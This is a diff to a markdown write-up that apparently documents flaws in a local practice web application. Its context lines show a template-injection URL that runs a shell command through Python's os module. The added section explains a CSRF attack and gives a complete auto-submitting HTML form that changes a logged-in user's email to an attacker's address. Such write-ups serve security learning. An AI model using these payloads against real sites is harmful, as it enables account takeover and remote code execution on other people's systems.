@@ -39,3 +39,24 @@ We can also achieve a RCE with: (reveals the files in the current directory)
 ```
 http://127.0.0.1:8080/find_secret?file={%%20for%20x%20in%20().__class__.__base__.__subclasses__()%20%}{%%20if%20%22warning%22%20in%20x.__name__%20%}{{x()._module.__builtins__[%27__import__%27](%27os%27).popen(%22dir%22).read()}}{%endif%}{%%20endfor%20%}
 ```
+
+
+### CSRF attack
+
+After logging in, there's a functionality to change the current user's email.
+
+Since the CSRF token is not implemented, attacker can craft a payload and put it inside a website to trick a user to visit the site, then submit a form to change the logged-in user's email to whatever the email attacker specifies it as.
+Payload:
+```
+<html>
+    <body>
+        <form action="https://vulnerable-website.com/email/change" method="POST">
+            <input type="hidden" name="email" value="pwned@evil-user.net" />
+        </form>
+        <script>
+            document.forms[0].submit();
+        </script>
+    </body>
+</html>
+
+```
